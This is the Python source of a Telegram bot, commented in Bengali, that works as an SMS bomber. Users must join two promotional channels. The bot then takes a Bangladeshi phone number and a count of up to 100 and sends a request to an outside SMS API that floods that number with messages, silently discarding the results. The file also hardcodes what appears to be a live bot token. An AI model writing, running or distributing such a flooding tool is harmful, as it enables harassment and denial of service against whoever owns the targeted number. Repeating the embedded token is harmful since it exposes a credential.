import asyncio
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandStart
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message, CallbackQuery
import requests

# তোমার ডিটেইলস
BOT_TOKEN = "8542056996:AAEJa7Qc5SXTRGeQRw_cnVXjRVx2Qt3TuuA"
CHANNEL_1_ID = "@freeincomezone002"
CHANNEL_1_LINK = "https://t.me/freeincomezone002"
CHANNEL_2_ID = "@SAYDUR2147"
CHANNEL_2_LINK = "https://t.me/SAYDUR2147"
API_BASE = "https://smsapi.jubairbro.store/api"
API_KEY = "bot"

# Logging শুধু error-এর জন্য (INFO বন্ধ)
logging.basicConfig(level=logging.ERROR)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

user_states = {}  # {user_id: {"state": "waiting_amount", "number": "..."}}

async def is_subscribed_to_both(user_id: int) -> bool:
    try:
        member1 = await bot.get_chat_member(chat_id=CHANNEL_1_ID, user_id=user_id)
        subscribed1 = member1.status in ["member", "administrator", "creator"]
        
        member2 = await bot.get_chat_member(chat_id=CHANNEL_2_ID, user_id=user_id)
        subscribed2 = member2.status in ["member", "administrator", "creator"]
        
        return subscribed1 and subscribed2
    except:
        return False

def get_join_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Join Channel 1", url=CHANNEL_1_LINK)],
        [InlineKeyboardButton(text="Join Channel 2", url=CHANNEL_2_LINK)],
        [InlineKeyboardButton(text="Verify", callback_data="verify_join")]
    ])

def get_bomb_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Start Bombing", callback_data="start_bomb")]
    ])

@dp.message(CommandStart())
async def start_handler(message: Message):
    user_id = message.from_user.id
    user_states.pop(user_id, None)  # Reset state
    if await is_subscribed_to_both(user_id):
        await message.answer(
            "Welcome back!\n"
            "You are already verified.\n"
            "Use to start",
            reply_markup=get_bomb_keyboard()
        )
    else:
        await message.answer(
            "Please Join Both Channels\n"
            "Then Click Verify Below",
            reply_markup=get_join_keyboard()
        )

@dp.callback_query(lambda c: c.data == "verify_join")
async def verify_handler(callback: CallbackQuery):
    user_id = callback.from_user.id
    if await is_subscribed_to_both(user_id):
        await callback.message.edit_text(
            "Joined Successfully!\n"
            "Now you can use the bot",
            reply_markup=get_bomb_keyboard()
        )
    else:
        await callback.answer("You haven't joined both channels!\nPlease join both.", show_alert=True)

@dp.callback_query(lambda c: c.data == "start_bomb")
async def start_bomb_handler(callback: CallbackQuery):
    user_id = callback.from_user.id
    user_states.pop(user_id, None)  # Reset state
    await callback.message.answer(
        "Enter the number you want to bomb\n"
        "Example: 019XXXXXXXX"
    )
    await callback.answer()

@dp.message()
async def message_handler(message: Message):
    user_id = message.from_user.id
    if not await is_subscribed_to_both(user_id):
        return

    text = message.text.strip()

    if user_id not in user_states:
        # Number validation (ভুল হলে আবার চাইবে, কোনো error মেসেজ না)
        if not text.isdigit() or len(text) != 11 or not text.startswith('01'):
            await message.answer("Enter the number you want to bomb\nExample: 019XXXXXXXX")
            return
        user_states[user_id] = {"state": "waiting_amount", "number": text}
        await message.answer("Enter the amount of SMS\nExample: 10, Max 100")
        return

    state = user_states[user_id]
    if state["state"] == "waiting_amount":
        # Amount ভুল হলে আবার চাইবে (কোনো error না)
        if not text.isdigit():
            await message.answer("Enter the amount of SMS\nExample: 10, Max 100")
            return

        amount = int(text)
        number = state["number"]

        if amount <= 0 or amount > 100:
            await message.answer("Enter the amount of SMS\nExample: 10, Max 100")
            return

        await message.answer(f"Bombing Starting... {amount} SMS to {number}")

        try:
            url = f"{API_BASE}?key={API_KEY}&num={number}&amount={amount}"
            response = requests.get(url, timeout=15)
            # কোনো Result দেখাবে না, সাইলেন্ট
        except:
            pass  # কোনো মেসেজ না পাঠিয়ে চুপ থাকবে

        user_states.pop(user_id, None)  # Clear state

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
